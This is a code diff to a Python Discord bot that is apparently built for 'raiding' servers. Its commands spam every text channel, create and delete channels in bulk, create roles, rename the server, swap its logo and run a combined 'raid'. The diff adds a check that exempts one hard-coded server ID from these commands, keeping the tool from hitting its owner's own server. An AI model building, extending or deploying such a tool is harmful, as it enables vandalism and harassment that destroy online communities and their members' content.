@@ -13,6 +13,9 @@ client = commands.Bot(command_prefix=prefix)
 
 client.remove_command('help')
 
+def guild_whitelist(ctx):
+    return ctx.guild.id != 729729444083662921
+
 @client.event
 async def on_ready(): # When bot is run
     print(f'Bot connected as {client.user}')
@@ -156,6 +159,7 @@ async def raid_list(ctx):
 
 #*Spam
 @client.command( pass_context = True )
+@commands.check(guild_whitelist)
 async def spam(ctx, amount: int, *, text):
     try:
         for channels in ctx.guild.text_channels:
@@ -166,6 +170,7 @@ async def spam(ctx, amount: int, *, text):
 
 #*Createchannels
 @client.command()
+@commands.check(guild_whitelist)
 async def createchannels(ctx, count: int, name: str, type: str):
     try:
         if type == 'text':
@@ -184,6 +189,7 @@ async def createchannels(ctx, count: int, name: str, type: str):
 
 #*DeleteChannels
 @client.command()
+@commands.check(guild_whitelist)
 async def delchannels(ctx, type: str):
     try:
         if type == 'all':
@@ -201,6 +207,7 @@ async def delchannels(ctx, type: str):
 
 #*CreateRole
 @client.command()
+@commands.check(guild_whitelist)
 async def createrole(ctx, name):
     try:
         role = await ctx.guild.create_role(name=name, color = discord.Colour(0x800080))
@@ -212,6 +219,7 @@ async def createrole(ctx, name):
 
 #*GuildName
 @client.command()
+@commands.check(guild_whitelist)
 async def guildname(ctx, *, name):
     try:
         await ctx.guild.edit(name=name)
@@ -221,6 +229,7 @@ async def guildname(ctx, *, name):
 
 #*GuildLogo
 @client.command()
+@commands.check(guild_whitelist)
 async def guildlogo(ctx):
     try:
         with open('logo.png', 'rb') as f:
@@ -231,6 +240,7 @@ async def guildlogo(ctx):
 
 #*FullRaid
 @client.command()
+@commands.check(guild_whitelist)
 async def raid(ctx, amount: int, text: str, style: str = None):
     try:
         if style == None:
